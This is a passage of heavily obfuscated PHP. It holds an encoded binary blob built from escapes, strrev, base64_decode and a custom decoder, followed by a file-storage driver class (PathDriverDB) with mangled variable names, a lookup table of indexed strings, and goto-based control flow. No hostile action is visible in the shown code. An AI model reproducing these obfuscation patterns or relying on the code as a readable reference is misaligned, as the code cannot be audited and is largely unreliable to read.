e\xe9\x4a\x61\xfe\x61\x5\x3d\x71\xc9\x5b\x2c\x14\xc8\x17\x69\xd\xc9\x5f\xfc\xb\x60\x89\x58\x73\x83\xcd\x5a\xc9\x8e\xd6\x78\x35\x3b\xa0\x1a\x2a\x27\xe\xb4\xc4".strrev('*(ß‡pµï&§ª9&D˜x¨	µPú @qMĞ¥#šVè¸ô€´çÌéì×;X°')."\xb8\x62\xcf\xe9\xb2\x6a\x28\x2\x0\xfb\x4\xaf\x28\xa7\x31\xc1\xc9\x9\x29\x1d\xc1\x65\x30\x2c\x8\x9f\x7c\xfc\x5f\x57\xae\xc6\xb9\x9f\x3\x5b\xd3\xd4\x38\x3d\xed\x66\xb6\xf2\xd8\xff"."\x6e\x8b\xf8\xe4\xc\x6d\x42\x81\xbf\xf8\xff\xea\x79\xde\x21\xbc\x2b\x82\xee\xa5\xd3\xe7\x1c\xd0\xbb\xb7\xe4\xdc\x81\x9d\xf1\x46\xf0\xab\x20\xfc\x13\x40\x6c\xd2\x87\x73\xe2\xd9\x88\x3b"."\x4e\x3d\x82\x53\xa9\xd\xba\x58\xf1\x52\xbd\x28\x8c\x70\xfe\x14\x66\x27\xb5\xc1\xcf\x61\x9\x5\xc8\x4b\xf0\x90\x80\x72\xb2\x54\x31\x1\x16\x34\x41\xbb\xe5\x6c\xd0\xe6\x43\xdf\x6e\x1c"."\147\171\347\261\340\33\320\134\151\364\172\100\71\211\313\354\54\203\324\50\125\42\145\20\177\126\101\232\102\257\355\360\117\40\267\12\336\114\316\264\10\141\35\242\161\253"."\200\142\14\100\334\7\227\134\240\351\205\226\31\56\0\130\344\173\77\155\27\63\317\202\276\234\263\11\115\104\3\42\200\140\37\301\357\203\100\223\145\34\302\142\237\3".strrev('ô0«…7—FdÂ)‚ß­”BÅæBò}h6”¡'."\n".' ìá}†¥j3×HèYŠâ0')."\272\4\260\170\360\27\152\37\207\177\172\311\57\245\362\366\252\361\272\46\115\51\147\143\337\142\171\167\132\0\164\52\134\22\103\245\340\71\270\234\145\144\213\270\320\147"."\117\173\360\345\105\323\204\51\205\36\221\150\35\245\250\15\54\131\135\173\163\217\351\174\7\262\172\271\146\47\135\314\52\12\131\247\211\76\313\303\132\130\116\72\60\357"."\x3\x29\x10\x8f\x35\xf\x8b\x61\xd1\x10\x10\x75\x1a\x24\x52\x9d\x48\x9c\xcd\x80\xa9\x42\x6\xfa\xa\x47\xdc\x81\x9e\x88\xc0\x74\xc8\xfe\xc\x89\xb0\x7e\x18\x71\x13\x4b\x27\xd3\x5a\x54"."\x4e\x7\xb1\x39\x8d\xc5\x5a\x5d\x7\x72\xb\x33\x96\xb3\x64\xc3\x20\xb7\x9c\xcb\x71\x65\xbc\x4d\x1\x4f\xf8\x11\xac\x8c\xcf\x67\x7d\xf8\x6e\x94\x5\xaa\xb\x72\x91\x68\x8a\x89\x8f\x20"."\370\5\20\222\35\174\255\33\237\71\220\156\213\125\322\163\37\364\3\45\247\66\341\231\103\167\341\71\21\64\367\241\354\215\140\27\107\316\357\134\242\340\102\62\110\123".base64_decode('JD7AlgUKJwRc9SiAVr3I6P4OlM1D60M1eMKin1Ylwbh+GOcyoXg5lB8W2x/HoA==')."\237\141\57\175\70\160\317\370\63\105\370\135\17\7\173\303\303\201\275\344\70\310\313\35\16\176\221\347\367\336\272\341\257\227\131\237\74\203\155\146\206\144\5\354\267\235"."\363\146\250\262\25\10\332\21\27\326\12\65\151\374\164\54\233\317\360\303\107\20\261\112\42\5\35\26\172\230\327\323\16\164\66\350\240\276\120\154\350\340\275\22\107\246"."\x8\xe\xff\x7b\x1d\xd8\x9e\x10\x89\x17\x71\x2b\xd5\xa9\x9f\x12\xd5\xe9\x19\x8b\x3d\x9b\x6a\x99\x75\x40\xa8\xe7\x6\xed\xd8\x67\x53\xc1\xbb\x1\x73\x32\xf1\xea\x9\x13\x27\x8b\x62\x3c".base64_decode('Hx9+dmF1O0kOUMiOzgdesk4rifqLEpcvSrRafBa+tCNMUStJ/t8tBc4U46yCJQ==')."\146\341\3\134\5\50\101\263\122\260\122\20\66\64\333\51\264\6\17\207\15\336\130\274\205\361\227\166\254\337\302\357\102\25\351\207\260\21\361\245\201\337\162\321\322\120"."\xbc\xcc\x40\xe5\xa6\xa9\xcb\x56\x39\xa9\x98\x38\x80\x30\x41\x65\xf\x15\xbd\xcd\xa7\xd8\xdb\x8e\x10\x43\x14\x9\x3c\x59\x90\x17\xc4\x1a\x4d\xcd\xae\x5\x81\xc5\xe1\x46\x85\x94\x70\x81"."\154\232\154\273\360\306\42\137\144\377\267\1\244\42\1\226\36\270\101\102\221\236\273\247\121\102\142\173\4\307\366\212\331\357\264\33\63\135\114\374\161\312\364\141\35\64"."\xa8\x82\xe6\x4c\x31\x3\x68\x80\x9\xf7\xc2\xa5\x31\x6b\x5f\x6d\xd5\x83\x62\xbc\x8e\xf9\xe\x69\xb4\x4c\x85\x5c\x98\xf0\xe8\xf\x77\xec\x20\xb0\x5c\xb0\x34\xbd\x1a\x35\x8a\x30\x4b\xa9"."\25\177\317\4\135\156\341\312\150\264\126\55\353\126\360\307\46\336\25\101\25\211\313\240\260\152\244\37\41\355\45\13\27\76\156\217\257\3\171\332\331\25\41\131\260\27"._kodDe('L5dwDQLBoZ+z7eRvXL9pO/E0gfG/ReBKyndWx+cvDuyS2jbCi9AjiJ0LNP5PR24=')."\304\3\303\376\2\16\140\247\104\67\164\40\312\146\70\331\74\11\325\103\246\271\370\153\16\373\363\167\71\341\252\255\355\335\120\101\125\151\175\21\324\162\45\17\272\40"."\xb0\x2d\x6b\x7a\xd1\xf\xde\x9b\xc4\xe7\x27\x84\xf0\x23\xff\x64\x38\x4c\x39\xf1\xff\xe7\xe7\xf0\xfe\x7f\xbd\x82\x37\xb1\x92\x2a\x95\x2d\x4f\xa5\xb5\x13\x6\x97\x72\x63\x23\x82\x13\x42"."\xac\xd0\xb4\xf5\xc3\xba\x45\xee\x29\xa6\x92\x19\xea\xb0\xc4\x48\x84\x2f\x38\xb8\xf7\xb8\x6c\x8f\xa3\xba\x98\x6d\x22\x75\x59\x41\x3d\x59\xc8\xf4\xc0\x44\x86\x6f\x0\x15\x28\x28\xe9\xdb"."\x59\x60\x46\xf6\xb1\xa7\x9d\x8a\x45\xa\x5f\x34\xb4\x4c\x3e\xca\x6f\xf2\x66\x66\xd5\x58\x5f\x91\x3\x38\x38\x4\x7e\xab\xcb\x3e\x81\x4b\x28\xc8\xc6\xe9\x13\x60\x26\xa8\x93\xe\x37\xd".base64_decode('xaCYBVlJShbFm2SBHBXIygklnj+Nkg90N5VQEZFyWEAF9CZs2QUtQBE9/BlQlw==')."\xf5\x21\x4a\x52\xa2\xd3\xf6\x72\x11\xce\x64\x88\xb8\xb5\x68\x93\xb\xcf\x63\xb\x4b\xb3\xc5\x2c\x16\x81\xb6\x9a\x56\x9d\xc\x7b\xfd\xb0\xd2\xfe\x1c\x62\x95\xb3\xf0\x63\xd8\x54\x1a\xea"."\23\202\120\342\247\23\22\35\70\240\3\301\42\145\360\262\14\361\74\243\114\377\342\213\220\275\135\51\10\302\40\44\366\227\56\346\156\135\103\254\230\25\312\264\32\202"."\x65\x9c\xf0\x14\x5f\xc1\x2b\x61\x36\xc5\x3d\x10\x8f\xf8\x49\x96\xaa\x21\x97\x9c\xa4\xdb\xa1\x9e\xce\x32\x64\xfd\x4f\x66\x2a\xe0\xee\x85\x67\x80\xcd\x4c\xe\x6b\xbb\xc4\x3d\x94\x5e\xb2"."\21\254\124\11\310\242\223\62\104\107\303\326\222\320\356\330\272\122\246\26\313\26\323\164\103\310\306\340\305\362\302\207\330\114\13\66\271\237\124\273\177\124\44\12\143\351"."\xd6\x22\xe4\x92\x63\x43\x11\x24\x9c\xaa\x1\xf6\x36\x6e\xf5\x7a\x8c\x12\x11\x98\x3a\x7e\xa2\x6f\x43\xf3\x73\x21\xeb\xb1\x1c\x73\x4a\x59\x40\xa9\xf2\xaa\x5f\x48\x46\xa5\xa8\xeb\x10\xf0"."\xb\x2f\x1b\xf9\xf8\xed\x6b\x94\x8c\xb5\xd9\x9e\x1\xd9\xa4\x87\x5b\xf6\x52\x3d\x16\x59\x42\x38\xc4\x8b\xa1\xb9\xe3\x2d\x3c\xa7\xe1\xc7\x47\xc2\xe6\x4f\x8b\x41\x61\x84\xd3\x5a\x1b\x5c"."\x20\xfe\x9c\xda\xc9\x3\xfc\x68\x86\x73\xbf\xf1\x38\x7b\x54\xd3\x92\x35\x4e\xf9\x7f\x6\x5\x10\xfe\xfe\x26\xe4\x75\x84\xfb\x8b\xdc\x30\x56\x19\xb4\x3f\xf7\xe6\x12\xef\x3c\x5a\x32\x16"._kodDe('LukyNu0skcLHXuNIMt6hFZMdU84eVI96g6BzTLuIVjgSwAqLsJxLntApIG+KasI=')."\x5b\x93\x65\x63\x63\x6\xf2\x20\x73\x7a\xa7\x5\x6a\x93\x9d\xa0\x56\x82\x6e\xe3\xb6\x24\x43\x7c\x2f\xd4\x7a\x36\x27\xa\xf6\xc2\x14\x50\xd2\x7e\xa1\x3a\xf1\xdc\x6e\xd4\x2\xa1\xe2\x1f"."\xe1\xb3\xd2\x8a\x62\xe1\x66\x2b\x4f\xa0\x9b\x95\x66\x41\xbe\x40\xec\x58\xc7\x48\xce\xa0\x98\x68\x69\x8e\x7d\x68\x11\xdb\xcf\xa7\x2f\x6\x66\x90\xe2\xd3\x45\x15\xc9\x85\xf9\x15\x5b\xeb".strrev('ÑQn¤V°ÿÃ„{AI^4%ÚœQVö½¼T>J×X˜R,‚RÆj ÆáöÅ')."\142\70\11\275\152\315\170\110\113\331\121\120\0\313\342\44\130\266\40\231\26\26\124\33\102\71\123\316\33\243\164\257\20\171\104\312\217\27\351\260\115\26\306\131\107\303"."\x67\xd1\xcc\x85\x9f\x23\x33\xce\x9e\x1b\xa9\x5\x8a\xb7\x82\x4b\xf3\xb6\x3\xd6\x62\xad\x28\x9a\x79\xd4\x56\x14\x79\xa9\x97\x78\xd1\x2a\x42\x6b\x69\x4a\x11\xea\xca\x4f\xe3\xb\xe9\x38".base64_decode('TytiG4DrhHu06J6lSLJoaFDcFCFYdOkbVhsBG1xEDLUXAhIbf8JWsGAdZyHp+Q==')."\154\137\126\143\333\104\234\133\165\101\13\116\366\320\53\373\134\101\155\326\251\231\315\13\326\230\105\15\152\35\350\375\357\2\111\66\115\37\50\21\155\221\261\324\242\231"."\152\114\260\123\262\277\170\216\323\351\107\322\202\2\316\246\373\342\322\276\345\174\272\210\166\10\201\10\273\306\225\316\26\313\154\274\377\23\155\73\76\164\153\201\147\256"."\xec\xa0\x5\x8a\x57\xe\xbc\x5f\xe2\x64\xf8\x4\xbb\x3\xa6\x85\xb5\x1c\xfa\x6d\xd6\x4c\x93\x52\x12\x20\xff\xa3\x9c\x88\xc9\x83\x9b\x9e\x43\xb0\x51\x0\x21\x7e\xaa\x2\xb1\x88\x14\xfd"."\150\72\42\262\201\202\344\370\17\12\234\41\5\247\42\142\143\211\300\3\4\26\21\367\64\162\146\327\226\267\35\74\162\0\20\42\243\332\20\365\205\6\257\202\362\366"."\360\367\141\145\73\43\307\171\20\62\337\104\213\13\164\341\326\160\343\24\67\161\63\353\104\165\70\211\227\221\105\271\244\245\70\166\170\317\54\15\177\257\6\242\233\344".base64_decode('VWD3k0itBB2xemf7QuFQQVK3JxSaFQi2Ym+VBcmolGDcUpDU3RHoGi3N2+nx+Q==').base64_decode('C9KgsUtXhDvLwUm+btRKj98fmDVaK3wt03lL0NEqV37nUhp7hocw/CE5TWVp4Q==')."\326\230\222\341\136\223\170\31\253\212\100\34\127\203\72\24\143\1\253\117\167\233\335\31\235\260\244\42\150\250\322\105\352\16\346\10\24\172\357\144\213\233\61\313\250\103"."\x9a\xcd\x38\x1e\x1f\x1e\xbb\x2c\x27\xce\x2\x1c\x2d\x16\x44\x62\x84\x49\x28\xee\xae\x8\x50\x51\x14\x63\xa2\xfe\xb4\x50\x9f\x8f\x52\x39\x46\x60\x4b\x4f\xd0\x88\x69\xd4\x22\x2d\x2a\xe8"."\xeb\xb1\xec\x42\x6e\x6f\x11\x1c\xb\xd6\x49\x38\x4c\x92\xff\x7\xe7\xf0\x2\x58\xaa\x9d\x0\x0".""."".base64_decode('').""."", 10, -8))); goto D†åÃëğ–; f³ƒõ©…Æ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($aù¿…Øâõ) { $this->pathParse = $aù¿…Øâõ; $this->model = Model($_SERVER[«¾°Ã¤][1207]); } public function getPath($B§Û·ƒµƒÔ) { return trim($B§Û·ƒµƒÔ, $_SERVER[«¾°Ã¤][8]); } public function pathFather($f¾Êóñô˜) { $bŠÙæËá = $this->parse($f¾Êóñô˜); $bŠÙæËá = $this->infoSimple($f¾Êóñô˜); return $bŠÙæËá ? $bŠÙæËá[$_SERVER[«¾°Ã¤][487]] : !1; } public function pathThis($a¼œğæÉ) { $b—“Ì‹ÈØ¼ = $this->infoSimple($a¼œğæÉ); return $b—“Ì‹ÈØ¼ ? $b—“Ì‹ÈØ¼[$_SERVER[«¾°Ã¤][28]] : !1; } public function getPathOuter($Aœë¸Öö) { if (!$Aœë¸Öö) { return $Aœë¸Öö; } $bÙã¡°Öøé = $this->parse($Aœë¸Öö); return KodIO::make($bÙã¡°Öøé[$_SERVER[«¾°Ã¤][393]]); } public function copyFolderFromIO($E‹Ü™°²£ñ, $aÓéíå§»‡, $a‘Ä„óëåÎ, $b‰ùÈğŒ³, $a¶ªó‘¦…) { $B¶Î‘†æ = $this->model->copyFolderFromIO($E‹Ü™°²£ñ, $aÓéíå§»‡, $a‘Ä„óëåÎ, $b‰ùÈğŒ³, $a¶ªó‘¦…); return KodIO::make($B¶Î‘†æ); } public function isParentOf($fÆ’¼çÚè, $cÇĞæìö) { return $this->model->isParentOf($fÆ’¼çÚè, $cÇĞæìö); } public function mkfile($bôÔ¹˜ˆ˜˜, $D©ø„Ë‡Ü‰ = '', $b«÷ì¸«Ê = REPEAT_RENAME) { $B»Û–Ê‚£” =& $_SERVER[«¾°Ã¤]; $f”èÌøåÑÔ = $this->parse($bôÔ¹˜ˆ˜˜); $bôÔ¹˜ˆ˜˜ = $f”èÌøåÑÔ[$B»Û–Ê‚£”[393]]; for ($eà‰ŸÀ‘·º = 0; $eà‰ŸÀ‘·º < count($f”èÌøåÑÔ[$B»Û–Ê‚£”[1208]]); $eà‰ŸÀ‘·º++) { $AËÆ‡Ş†‘ = $f”èÌøåÑÔ[$B»Û–Ê‚£”[1208]][$eà‰ŸÀ‘·º]; if ($eà‰ŸÀ‘·º == count($f”èÌøåÑÔ[$B»Û–Ê‚£”[1208]]) - 1) { $bôÔ¹˜ˆ˜˜ = $this->model->mkfile($bôÔ¹˜ˆ˜˜, $AËÆ‡Ş†‘, $D©ø„Ë‡Ü‰, $b«÷ì¸«Ê); break; } $bôÔ¹˜ˆ˜˜ = $this->model->mkdir($bôÔ¹˜ˆ˜˜, $AËÆ‡Ş†‘, REPEAT_SKIP); } return $this->getPathOuter($bôÔ¹˜ˆ˜˜); } public function mkdir($bÕ·ä¨È‹¦, $cğÃ•Áñ¡£ = REPEAT_SKIP) { $B•¹¾à…Ä =& $_SERVER[«¾°Ã¤]; $f‹–º‹×÷° = $this->parse($bÕ·ä¨È‹¦); $bÕ·ä¨È‹¦ = $f‹–º‹×÷°[$B•¹¾à…Ä[393]]; for ($AççÎë•Ã» = 0; $AççÎë•Ã» < count($f‹–º‹×÷°[$B•¹¾à…Ä[1208]]); $AççÎë•Ã»++) { $CÑß“á˜¹Ğ = $f‹–º‹×÷°[$B•¹¾à…Ä[1208]][$AççÎë•Ã»]; $bÕ·ä¨È‹¦ = $this->model->mkdir($bÕ·ä¨È‹¦, $CÑß“á˜¹Ğ, $cğÃ•Áñ¡£); } return $this->getPathOuter($bÕ·ä¨È‹¦); } public function copyFile($a³Ï‹ëƒœñ, $Fˆ¿ì‚ĞÍ, $dß«”•‘†– = REPEAT_REPLACE) { $Fñ½İõŒÀ” =& $_SERVER[«¾°Ã¤]; $aô“‘Ğù = $this->parse($Fˆ¿ì‚ĞÍ); $eœ—É‘½È = $this->model->copy($a³Ï‹ëƒœñ, $aô“‘Ğù[$Fñ½İõŒÀ”[393]], $dß«”•‘†–, $aô“‘Ğù[$Fñ½İõŒÀ”[76]]); return $eœ—É‘½È ? $this->getPathOuter($eœ—É‘½È) : !1; } public function moveFile($BœÉÄœ¦¡, $AªÌ¯éà†, $d‚—¤öš“‚ = REPEAT_REPLACE) { $FÂïĞòíğÒ =& $_SERVER[«¾°Ã¤]; $f‚ñà®æÄå = $this->parse($AªÌ¯éà†); $D«İ×ê„ñí = $this->model->move($BœÉÄœ¦¡, $f‚ñà®æÄå[$FÂïĞòíğÒ[393]], $d‚—¤öš“‚, $f‚ñà®æÄå[$FÂïĞòíğÒ[76]]); return $D«İ×ê„ñí ? $this->getPathOuter($D«İ×ê„ñí) : !1; } public function copy($EŠ¸…µ¸Åè, $eˆÃÂŠù, $AŠåçŸÊğ¤ = REPEAT_REPLACE) { $aïïõ¬« = $this->parse($eˆÃÂŠù); $aòˆòË±¤É = $this->model->copy($EŠ¸…µ¸Åè, $aïïõ¬«[$_SERVER[«¾°Ã¤][393]], $AŠåçŸÊğ¤); return $aòˆòË±¤É ? $this->getPathOuter($aòˆòË±¤É) : !1; } public function moveSameAllow() { } public function move($f²ª‰ÛšÆ, $AÔùĞ«Ô²”, $e’»†šøŸ„ = REPEAT_REPLACE) { $Dï¢æğõÑ× = $this->parse($AÔùĞ«Ô²”); $dŠ˜ŠĞÇÍ„ = $this->model->move($f²ª‰ÛšÆ, $Dï¢æğõÑ×[$_SERVER[«¾°Ã¤][393]], $e’»†šøŸ„); return $dŠ˜ŠĞÇÍ„ ? $this->getPathOuter($dŠ˜ŠĞÇÍ„) : !1; } public function remove($c˜Î°â˜õŠ, $EñŠ¬‘çÂ = true) { return $this->model->remove($c˜Î°â˜õŠ, $EñŠ¬‘çÂ); } public function rename($F‰Ìâ¿•Ì¥, $d‘Šë³Æ‚á) { $E¥ÌâåÜÃ = $this->model->rename($F‰Ìâ¿•Ì¥, $d‘Šë³Æ‚á); return $E¥ÌâåÜÃ ? $this->getPathOuter($F‰Ìâ¿•Ì¥) : $E¥ÌâåÜÃ; } public function size($E»Ü‡Å–‡×) { $EõÇ™Ø¡¥¶ = $this->infoSimple($E»Ü‡Å–‡×); return $EõÇ™Ø¡¥¶ ? $EõÇ™Ø¡¥¶[$_SERVER[«¾°Ã¤][78]] : 0; } public function infoSimple($cæÚÌ«Àª) { return $this->model->sourceInfo($cæÚÌ«Àª); } public function info($eáŠ¨ÑÃ) { return $this->infoParse($eáŠ¨ÑÃ); } public function infoAuth($bœô‹›‡®) { return $this->infoParse($bœô‹›‡®, !1, !0); } public function infoWithChildren($D±à‰‹‚ÒÅ) { return $this->infoParse($D±à‰‹‚ÒÅ, !0); } protected function infoParse($aÑÖ’×òö, $C­±ˆŠÌàâ = false, $f®ŠÚ­¡á‹ = false) { if (!$C­±ˆŠÌàâ) { return $this->model->pathInfo($aÑÖ’×òö, $f®ŠÚ­¡á‹); } return $this->model->pathInfoMore($aÑÖ’×òö); } public function infoFull($eÈÑÈãõ) { $aĞšãÚªÄö =& $_SERVER[«¾°Ã¤]; $Cæ¯§Óîï = explode($aĞšãÚªÄö[8], $eÈÑÈãõ); $Déá‰ì‰Üò = implode($aĞšãÚªÄö[8], array_splice($Cæ¯§Óîï, 1)); return $this->model->pathInfoByPath($Cæ¯§Óîï[0], $Déá‰ì‰Üò); } public function hashSimple($CÔŸÂƒ¨•) { $c¬¡æ‹ÇŞ =& $_SERVER[«¾°Ã¤]; $dÙÍ‰ŸµÀ× = $this->infoWithChildren($CÔŸÂƒ¨•); return $dÙÍ‰ŸµÀ×[$c¬¡æ‹ÇŞ[164]][$c¬¡æ‹ÇŞ[171]]; } public function hashMd5($B³†è±”¯ç) { $bù«œÊÁ¶ =& $_SERVER[«¾°Ã¤]; $e—†Î‹¢ôÂ = $this->infoWithChildren($B³†è±”¯ç); return $e—†Î‹¢ôÂ[$bù«œÊÁ¶[164]][$bù«œÊÁ¶[170]]; } public function exist($cšˆåßÎæ¸) { $E…“¦Í—÷ =& $_SERVER[«¾°Ã¤]; $A½£ô˜°ø = $this->parse($cšˆåßÎæ¸); if (!$A½£ô˜°ø[$E…“¦Í—÷[76]]) { return $this->isFile($cšˆåßÎæ¸) || $this->isFolder($cšˆåßÎæ¸); } $AèÏñÍ­ä = array($E…“¦Í—÷[403] => $A½£ô˜°ø[$E…“¦Í—÷[393]], $E…“¦Í—÷[28] => $A½£ô˜°ø[$E…“¦Í—÷[76]]); $Fª÷ÂŒÏƒ¥ = $this->model->where($AèÏñÍ­ä)->find(); return $Fª÷ÂŒÏƒ¥ ? !0 : !1; } public function isFile($dñÍì÷æºº) { $e‡Äšã‡ =& $_SERVER[«¾°Ã¤]; $e‘¨£Ó•”¾ = $this->infoSimple($dñÍì÷æºº); return $e‘¨£Ó•”¾ && $e‘¨£Ó•”¾[$e‡Äšã‡[412]] == $e‡Äšã‡[87] ? !1 : !0; } public function isFolder($cËó“ó¹Ş·) { $BÉ°’ˆàå– =& $_SERVER[«¾°Ã¤]; $eĞŞ¬ª°ÉÆ = $this->infoSimple($cËó“ó¹Ş·); return $eĞŞ¬ª°ÉÆ && $eĞŞ¬ª°ÉÆ[$BÉ°’ˆàå–[412]] == $BÉ°’ˆàå–[87] ? !0 : !1; } public function listPath($BŒ§¨‹ÛáÖ, $dç³×÷îİá = false) { $B†ØŠó¶›ô =& $_SERVER[«¾°Ã¤]; if ($BŒ§¨‹ÛáÖ == $B†ØŠó¶›ô[33]) { return !1; } $BÉÅÁ³Ù‡¡ = array($B†ØŠó¶›ô[403] => $BŒ§¨‹ÛáÖ); if ($dç³×÷îİá) { return $this->model->listSource($BÉÅÁ³Ù‡¡, -1); } return $this->model->listSource($BÉÅÁ³Ù‡¡); } public function has($b³µƒŒ·½, $côŞåğ‡¢ƒ = false, $fİ‰É´É¨‡ = null) { $d ¹ÏŸÌÂò =& $_SERVER[«¾°Ã¤]; $FÅ„¨Å½ = $this->infoWithChildren($b³µƒŒ·½); if ($côŞåğ‡¢ƒ) { return array($d ¹ÏŸÌÂò[204] => $FÅ„¨Å½[$d ¹ÏŸÌÂò[204]], $d ¹ÏŸÌÂò[203] => $FÅ„¨Å½[$d ¹ÏŸÌÂò[203]]); } return $fİ‰É´É¨‡ ? $FÅ„¨Å½[$d ¹ÏŸÌÂò[204]] : $FÅ„¨Å½[$d ¹ÏŸÌÂò[203]]; } public function listAll($cå©Š·ˆ‚) { $bßñÈ®‹‘× = IO::info($this->pathParse[$_SERVER[«¾°Ã¤][76]]); if (!$bßñÈ®‹‘×) { return array(); } return $this->model->listAll($cå©Š·ˆ‚); } public function getContent($dÓ†½èª³¯) { return $this->model->getContent($dÓ†½èª³¯); } public function setContent($Déà‡Œˆ¡Ü, $b†§êÚˆŞÚ = '') { return $this->model->setContent($Déà‡Œˆ¡Ü, $b†§êÚˆŞÚ); } public function fileSubstr($cùÃª‡Ô, $eÁíâ”İ¶¯, $c‚†äÀ£°È) { return $this->model->fileSubstr($cùÃª‡Ô, $eÁíâ”İ¶¯, $c‚†äÀ£°È); } public function download($cÖÂê¥ÀïÂ, $FÙÏ™ìÈøÙ = '') { $bˆ¹Ûø”˜¿ = get_path_father($FÙÏ™ìÈøÙ); $EËè„’â = get_path_this($FÙÏ™ìÈøÙ); $EÙŞ«Ú¾òÈ = $this->model->fileInfoGet($cÖÂê¥ÀïÂ); $EÕÈ¦Ò›ÚÆ = IO::copy($EÙŞ«Ú¾òÈ[$_SERVER[«¾°Ã¤][76]], $bˆ¹Ûø”˜¿, !1, $EËè„’â); return $EÕÈ¦Ò›ÚÆ; } public function setModifyTime($c·ÍÔ¥ŒÊ÷, $C†š´§†á‚ = '') { $FáŒ’—‹Áµ =& $_SERVER[«¾°Ã¤]; if (!$c·ÍÔ¥ŒÊ÷) { return; } $this->model->where(array($FáŒ’—‹Áµ[419] => $c·ÍÔ¥ŒÊ÷))->save(array($FáŒ’—‹Áµ[84] => $C†š´§†á‚)); } public function upload($a…§Ñ‰±½, $D¬†“¤…±, $EÂÄíá´ğ = false, $B°“—·’‹œ = REPEAT_REPLACE) { $e¾É×›”ª£ =& $_SERVER[«¾°Ã¤]; $A¿ñ«Ã±Ô = $this->parse($a…§Ñ‰±½); $cãº†”ÒÁô = $this->model->addFile($A¿ñ«Ã±Ô[$e¾É×›”ª£[393]], $D¬†“¤…±, $A¿ñ«Ã±Ô[$e¾É×›”ª£[76]], $EÂÄíá´ğ, $B°“—·’‹œ); return $this->getPathOuter($cãº†”ÒÁô); } public function uploadFileByID($D§ù”’§Š, $Eå¨ÎÒáÅ¾, $cù”ˆİ¼ª) { $BšÀÃ¸‰½… =& $_SERVER[«¾°Ã¤]; $DôÎ¦Ø´‰ = $this->parse($D§ù”’§Š); $FòéîæÕ± = $this->model->addFileByFileID($DôÎ¦Ø´‰[$BšÀÃ¸‰½…[393]], $Eå¨ÎÒáÅ¾, $DôÎ¦Ø´‰[$BšÀÃ¸‰½…[76]], $cù”ˆİ¼ª); return $this->getPathOuter($FòéîæÕ±); } public function addFileByRemote($A¡Æ¨Îï°¬, $D‹¢ºˆÑ, $fÛÄéÉ…ÌØ = array(), $C²µê»¬‡ = '', $f¨Ÿº«ôö) { $fŸŠŒ…›” =& $_SERVER[«¾°Ã¤]; $B™‹ß…´Ì£ = $this->parse($A¡Æ¨Îï°¬); $C²µê»¬‡ = empty($C²µê»¬‡) ? $B™‹ß…´Ì£[$fŸŠŒ…›”[76]] : $C²µê»¬‡; $eª•¨¡ã™ = $this->model->addFileByRemote($B™‹ß…´Ì£[$fŸŠŒ…›”[393]], $D‹¢ºˆÑ, $C²µê»¬‡, $fÛÄéÉ…ÌØ, $f¨Ÿº«ôö); return $this->getPathOuter($eª•¨¡ã™); } public function uploadLink($a“ˆ±İÓ‚Á, $bŠŠÓ¯‰ê” = 0) { $Dâ¦àĞÅ«¤ =& $_SERVER[«¾°Ã¤]; $BùÜ£±ö®ê = $this->parse($a“ˆ±İÓ‚Á); $f¼ĞéØ©¥Î = _get($GLOBALS[$Dâ¦àĞÅ«¤[7]], $Dâ¦àĞÅ«¤[1209]); $a™¬îŸ®îƒ = _get($GLOBALS[$Dâ¦àĞÅ«¤[7]], $Dâ¦àĞÅ«¤[1210]); $a“ˆ±İÓ‚Á = Model($Dâ¦àĞÅ«¤[580])->createFileName($BùÜ£±ö®ê[$Dâ¦àĞÅ«¤[76]], $f¼ĞéØ©¥Î, $a™¬îŸ®îƒ); return IO::uploadLink($a“ˆ±İÓ‚Á, $bŠŠÓ¯‰ê”); } public function fileNameAuto($c«›Ìß‚Ü‚, $FæËã†íå‡, $C«ø§“æÂÖ = REPEAT_REPLACE, $CÌÏÊ ²„• = false) { return $this->model->fileNameAuto($c«›Ìß‚Ü‚, $FæËã†íå‡, $C«ø§“æÂÖ, $CÌÏÊ ²„•); } public function fileNameExist($FÄâ’Ê¸ğ, $a¹ã…ŠÚâ) { return $this->model->fileNameExist($FÄâ’Ê¸ğ, $a¹ã…ŠÚâ); } protected function _fileOut($d²°•ß´Ü¦, $bËßÁÊ™õŒ = false, $a¶±ë§„ = false, $eğ¶¢ÎÊ‹ç = '', $bí¿«ñäÈ = false) { goto C¸ÒŸÕÙ™Ô; e¤Œİğ•îÕ: $Aî¡ÜŠé› = $this->model->fileInfoGet($d²°•ß´Ü¦); $eğ¶¢ÎÊ‹ç = $Aî¡ÜŠé›[$d‹ì®¼÷Åğ[170]] ? $Aî¡ÜŠé›[$d‹ì®¼÷Åğ[170]] : $eğ¶¢ÎÊ‹ç; $dğ•­¬†‡ = isset($GLOBALS[$d‹ì®¼÷Åğ[1212]]) ? $GLOBALS[$d‹ì®¼÷Åğ[1212]] : $CëìÈñ£‚ô[$d‹ì®¼÷Åğ[28]]; goto aœˆ„…ªí; aœˆ„…ªí: if ($bí¿«ñäÈ) { return IO::fileOutServer($Aî¡ÜŠé›[$d‹ì®¼÷Åğ[76]], $bËßÁÊ™õŒ, $dğ•­¬†‡, $eğ¶¢ÎÊ‹ç); } IO::fileOut($Aî¡ÜŠé›[$d‹ì®¼÷Åğ[76]], $bËßÁÊ™õŒ, $dğ•­¬†‡, $eğ¶¢ÎÊ‹ç); goto f­Ìèä‚Ñ‡; C¸ÒŸÕÙ™Ô: $d‹ì®¼÷Åğ =& $_SERVER[«¾°Ã¤]; $CëìÈñ£‚ô = $this->model->sourceInfo($d²°•ß´Ü¦); if ($CëìÈñ£‚ô[$d‹ì®¼÷Åğ[412]] == $d‹ì®¼÷Åğ[87]) { header($d‹ì®¼÷Åğ[1211]); die; } goto e¤Œİğ•îÕ; f­Ìèä‚Ñ‡: } public function fileOut($C±ãâ² Á, $C¯œáçƒ§¼ = false, $DÏÍÕ´‚ÃÙ = false, $E¥ŸåÇ™–½ = '') { $this->_fileOut($C±ãâ² Á, $C¯œáçƒ§¼, $DÏÍÕ´‚ÃÙ, $E¥ŸåÇ™–½); } public function fileOutServer($B²¾ÈŞìˆÓ, $EÎÒÊ”Îô² = false, $BìˆÂ¼á«  = false, $FæùËß˜ù¦ = '') { $this->_fileOut($B²¾ÈŞìˆÓ, $EÎÒÊ”Îô², $BìˆÂ¼á« , $FæùËß˜ù¦, !0); } protected function _fileOutImage($aáÔÊèÕ¥, $F§¥Ò®‹Ã = 250) { goto Cˆ†½Ç£­·; e”¨‚–ª°³: $GLOBALS[$E°¥™‹Òõ[1212]] = $fÁ†…ä¬„Ã[$E°¥™‹Òõ[28]]; 